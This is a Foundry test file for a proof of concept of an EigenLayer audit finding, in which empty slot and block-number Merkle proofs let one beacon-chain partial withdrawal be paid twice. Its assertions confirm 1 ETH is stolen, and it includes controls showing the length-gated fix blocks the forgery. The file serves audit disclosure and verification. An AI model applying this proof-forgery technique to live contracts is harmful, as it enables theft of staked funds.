// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    EigenPod,
    EigenPodFixed,
    BeaconChainProofs,
    Merkle,
    Endian
} from "./20056-h-01-slot-and-block-number-proofs-not-required-for-verificat.sol";

// EigenLayer [H-01] (Code4rena 2023-04): empty slot/blockNumber Merkle proofs
// verify (leaf == root when the proof is empty), forging the slot & block-number
// identity of a genuine partial withdrawal. This defeats EigenPod's per-slot
// replay guard, so the SAME 1-ETH beacon withdrawal is processed TWICE ->
// attacker receives 2 ETH (1 ETH stolen from pod-backing funds).
contract SlotBlockNumberEmptyProofTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_emptyProof_doublePartialWithdrawal_stealsETH() public {
        Exploit e = new Exploit();

        uint256 attackerBefore = ATTACKER.balance;
        vm.deal(address(this), 5 ether);
        e.run{value: 3 ether}();

        // --- HARM: attacker got 2x a single 1-ETH partial withdrawal ---
        uint256 amount = e.AMOUNT_WEI();
        assertEq(amount, 1 ether, "withdrawal amount");
        assertEq(e.totalPaidToAttacker(), 2 * amount, "attacker double-paid (2 ETH)");
        assertEq(e.stolenWei(), amount, "1 ETH stolen (illegitimate second payout)");
        assertEq(ATTACKER.balance - attackerBefore, 2 ether, "attacker net +2 ETH");

        // --- the forgery genuinely changed the slot identity ---
        assertTrue(e.slotForged() != e.slotReal(), "forged slot differs from real slot");

        // --- guard B is real: an EXACT genuine replay was blocked ---
        assertTrue(e.genuineReplayReverted(), "per-slot guard blocks exact replay");

        // --- negative control: the length-gated fix rejects the empty-proof forgery ---
        assertTrue(e.fixedBlockedForged(), "fixed pod rejects empty slot/blockNumber proof");
    }

    // Direct, cheatcode-based negative control on the fixed pod: the empty slot
    // proof reverts on the length gate, so no double-withdrawal is possible.
    address internal constant CONTROL = 0x000000000000000000000000000000000000c011;

    function test_control_fixedPod_rejectsEmptyProofForgery() public {
        Exploit e = new Exploit();
        EigenPodFixed fixedPod = e.podFixed();
        vm.deal(address(fixedPod), 2 ether);

        // genuine full proof succeeds on the fixed pod (pays the fixed pod's owner)
        fixedPod.verifyAndProcessWithdrawal(e.genuineProofs(), e.withdrawalFieldsView());
        assertEq(CONTROL.balance, 1 ether, "genuine partial withdrawal paid once");

        // Evaluate the call arguments BEFORE arming expectRevert (otherwise the
        // argument getter calls would consume the revert expectation).
        BeaconChainProofs.WithdrawalProofs memory fp = e.forgedProofs();
        bytes32[] memory w = e.withdrawalFieldsView();

        // the empty-proof forgery reverts on the added length gate
        vm.expectRevert(bytes("slotProof has incorrect length"));
        fixedPod.verifyAndProcessWithdrawal(fp, w);
    }

    // Unit-level demonstration of the ROOT CAUSE in the verbatim Merkle library:
    // an empty proof "verifies" whenever leaf == root, with no length gate.
    function test_unit_emptyProofVerifiesWhenLeafEqualsRoot() public view {
        bytes32 root = keccak256("some-genuine-root");
        // empty proof, leaf == root => verifyInclusionSha256 returns true
        assertTrue(Merkle.verifyInclusionSha256(bytes(""), root, root, 0), "empty proof verifies leaf==root");
        // a different leaf with an empty proof does NOT verify (sanity)
        assertFalse(
            Merkle.verifyInclusionSha256(bytes(""), root, keccak256("other"), 0), "empty proof rejects leaf!=root"
        );
    }
}
